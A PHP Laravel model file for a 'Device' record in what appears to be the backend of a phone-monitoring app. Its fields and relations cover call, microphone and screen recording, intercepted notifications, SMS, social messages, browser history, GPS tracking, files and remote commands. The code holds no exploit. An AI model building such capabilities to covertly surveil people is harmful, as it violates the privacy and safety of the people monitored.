<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Keky\QueryMaster\Concerns\HasFilters;
use Keky\QueryMaster\Concerns\IsSearchable;
use Keky\QueryMaster\Concerns\IsSortable;
use Keky\QueryMaster\Enums\FilterOperator;
use Keky\QueryMaster\Enums\SearchOperator;
use Keky\QueryMaster\Filter;
use Keky\QueryMaster\Search;

class Device extends Model
{
    use HasFactory, HasFilters, IsSearchable, IsSortable;

    protected $fillable = [
        'user_id',
        'uuid',
        'platform',
        'brand',
        'model',
        'os_version',
        'app_version',
        'device_name',
        'ip_address',
        'fcm_token',
        'call_recording_enabled',
        'microphone_recording_interval',
        'microphone_recording_continuous',
        'screen_recording_enabled',
        'sync_status',
        'sync_started_at',
    ];

    protected array $sortable = [
        'uuid',
        'platform',
        'brand',
        'model',
        'device_name',
        'created_at',
        'updated_at',
    ];

    protected function casts(): array
    {
        return [
            'call_recording_enabled'          => 'boolean',
            'microphone_recording_interval'  => 'integer',
            'microphone_recording_continuous' => 'boolean',
            'screen_recording_enabled'        => 'boolean',
        ];
    }

    public function searchable(): array
    {
        return [
            Search::make('uuid', SearchOperator::LIKE),
            Search::make('device_name', SearchOperator::LIKE),
            Search::make('brand', SearchOperator::LIKE),
            Search::make('model', SearchOperator::LIKE),
        ];
    }

    public function filters(): array
    {
        return [
            Filter::make('platform', 'platform__eq')
                ->setOperator(FilterOperator::EQUAL)
                ->setValidationRules(['platform__eq' => 'string']),
            Filter::make('uuid', 'uuid__eq')
                ->setOperator(FilterOperator::EQUAL)
                ->setValidationRules(['uuid__eq' => 'string']),
        ];
    }

    public function user()
    {
        return $this->belongsTo(User::class);
    }

    public function calls()
    {
        return $this->hasMany(DeviceCall::class);
    }

    public function sms()
    {
        return $this->hasMany(DeviceSms::class);
    }

    public function media()
    {
        return $this->hasMany(DeviceMedia::class);
    }

    public function ingestedPayloads()
    {
        return $this->hasMany(IngestedPayload::class);
    }

    public function contacts()
    {
        return $this->hasMany(DeviceContact::class);
    }

    public function interceptedNotifications()
    {
        return $this->hasMany(DeviceNotification::class);
    }

    public function gpsLocations()
    {
        return $this->hasMany(DeviceGpsLocation::class);
    }

    public function geofences()
    {
        return $this->hasMany(DeviceGeofence::class);
    }

    public function geofenceAlerts()
    {
        return $this->hasMany(DeviceGeofenceAlert::class);
    }

    public function socialMessages()
    {
        return $this->hasMany(DeviceSocialMessage::class);
    }

    public function browserHistories()
    {
        return $this->hasMany(DeviceBrowserHistory::class);
    }

    public function installedApps()
    {
        return $this->hasMany(DeviceInstalledApp::class);
    }

    public function files()
    {
        return $this->hasMany(DeviceFile::class);
    }

    public function remoteCommands()
    {
        return $this->hasMany(DeviceRemoteCommand::class);
    }

    public function restrictionRules()
    {
        return $this->hasMany(DeviceRestrictionRule::class);
    }
}
